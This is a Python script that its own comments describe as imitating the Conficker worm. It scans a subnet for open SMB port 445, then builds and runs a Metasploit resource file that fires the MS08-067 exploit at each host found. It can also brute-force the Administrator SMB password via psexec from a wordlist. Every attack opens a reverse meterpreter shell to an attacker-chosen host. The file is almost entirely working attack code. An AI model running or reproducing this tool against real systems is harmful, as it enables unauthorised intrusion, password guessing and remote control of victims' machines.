#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 19-5-12 下午12:06
# @Author  : Zhangbin
# @Site    : home
# @File    : conficker.py
# @Software: PyCharm

#模仿conficker，实现漏洞利用和smb密码暴力破解

import os
import optparse
import sys
import nmap

def find_tgts(sub_net):
    """查找开启445端口的主机"""
    nmscan = nmap.PortScanner()
    nmscan.scan(sub_net, '445')
    tgt_hosts = []
    for host in nmscan.all_hosts():
        if nmscan[host].has_tcp(445):
            state = nmscan[host]['tcp'][445]['state']
            if state == 'open':
                print('[+] Found target host: ' + host)
                tgt_hosts.append(host)
    return tgt_hosts

def setup_handler(configfile, lhost, lport):
    """设置回连至攻击主机的相关参数，设置multi/handler监听器"""
    configfile.write('use exploit/multi/handler\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    configfile.write('exploit -j -z\n')
    # 设定全局变量，之间一次监听，不必重复建立监听
    configfile.write('setg DisablePayloadHandler l\n')

def conficker_exploit(configfile, tgthost, lhost, lport):
    """在rc中写入用于生产漏洞利用的代码"""
    configfile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configfile.write('set RHOST ' + str(tgthost) + '\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    # 在同一个上下文环境-j，不做交互-z
    configfile.write('exploit -j -z\n')

def smb_brute(configfile, tgthost, passwrodfile, lhost, lport):
    """暴力破解smb密码"""
    user_name = 'Administrator'
    with open(passwrodfile, 'r') as f :
        for password in f.readlines():
            password = password.strip('\n').strip('\r')
            configfile.write('use exploit/windows/smb/psexec\n')
            configfile.write('set SMBUser ' + str(user_name) + '\n')
            configfile.write('set SMBPass ' + str(password) + '\n')
            configfile.write('set RHOST ' + str(tgthost) + '\n')
            configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
            configfile.write('set LPORT ' + str(lport) + '\n')
            configfile.write('set LHOST ' + lhost + '\n')
            configfile.write('exploit -j -z\n')

def main():
    config_file = open('meta.rc', 'w')
    parser = optparse.OptionParser('[-] Usage%prog -H <RHOST[s]> -l <LHOST> '
                                   '[-p <LPORT> -F <Password file>]')
    parser.add_option('-H', dest='tgthost', type='string',
                      help='specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string',
                      help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string',
                      help='specify the listen address')
    parser.add_option('-F', dest='passwordfile', type='string',
                      help='password file for SMB brute force attempt')
    (options, args) = parser.parse_args()
    if (options.tgthost == None) | (options.lhost == None):
        print(parser.usage)
        exit(0)
    lhost = options.lhost
    lport = options.lport
    # 如果没有设置监听端口，设置为1337
    if lport == None:
        lport = '1337'
    passwrodfile = options.passwordfile
    # 筛选出445端口开放的ip地址
    tgthosts = find_tgts(options.tgthost)
    setup_handler(config_file, lhost, lport)
    for tgthost in tgthosts:
        conficker_exploit(config_file, tgthost, lhost, lport)
        if passwrodfile != None:
            smb_brute(config_file, tgthost, passwrodfile, lhost, lport)
    config_file.close()
    os.system('msfconsole -r meta.rc')

if __name__ == '__main__':
    main()




